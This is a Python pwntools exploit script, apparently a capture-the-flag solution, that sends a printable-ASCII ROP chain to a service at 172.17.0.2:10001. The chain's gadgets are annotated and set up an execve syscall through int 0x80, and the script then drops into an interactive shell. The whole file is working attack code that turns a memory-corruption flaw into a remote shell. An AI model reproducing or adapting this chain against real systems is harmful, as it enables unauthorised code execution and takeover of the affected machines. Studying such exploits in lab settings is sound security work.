#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

shellcode = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"
shellcode += "(0dU"             # pop ebx
shellcode += "~~kU"             # addr(0x556b7e7e)
shellcode += "7zaU"             # mov eax, 0x20
shellcode += "cBdU"*0x19        # inc eax    0x19 times
shellcode += "`(mU"             # add ah, al
shellcode += "cBdU"*0x35        # inc eax    0x35 times
shellcode += "CNcU"             # add bh, ah
shellcode += ">d_U"             # add bl, al
shellcode += "_mgU"             # pop eax; add esp, 0x5c
shellcode += "9~KU"             # addr(0x556b7e39)
shellcode += "A" * 0x5c         # dummy
shellcode += "`(mU"             # add ah, al
shellcode += "cBdU"*0x35        # inc eax    0x35 times
shellcode += "r{^U"             # mov dword [edx], eax; ea eax, dword [edx+0x03]
shellcode += "z-dU"*0x4         # inc edx; xor eax, eax -> edx +4
shellcode += "r{^U"             # mov dword [edx], eax; ea eax, dword [edx+0x03]
shellcode += "?yaU"             # mov edx, 0xffffffff
shellcode += "z-dU"             # inc edx; xor eax, eax
shellcode += "cBdU"*0xb         # inc eax     0xb times
shellcode += "wqfU"             # int 0x80

io.sendline(shellcode)
io.recv()
io.interactive()